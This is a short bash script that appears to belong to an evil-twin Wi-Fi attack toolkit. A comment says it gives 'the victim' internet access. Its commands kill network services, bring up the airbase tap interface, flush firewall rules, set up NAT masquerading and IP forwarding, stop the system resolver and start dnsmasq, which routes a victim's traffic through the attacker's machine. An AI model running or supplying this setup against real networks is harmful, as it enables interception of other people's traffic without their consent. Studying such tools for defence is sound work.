#!/bin/bash
#This script provides the victim with internet access and allows for packet forwarding
sudo airmon-ng check kill
sudo ifconfig at0 10.0.0.1 up
sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface enp0s3 -j MASQUERADE
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo sh -c "echo '1'>/proc/sys/net/ipv4/ip_forward"
sudo systemctl stop systemd-resolved.service
sudo dnsmasq -C ./conf/dnsmasq.conf -d
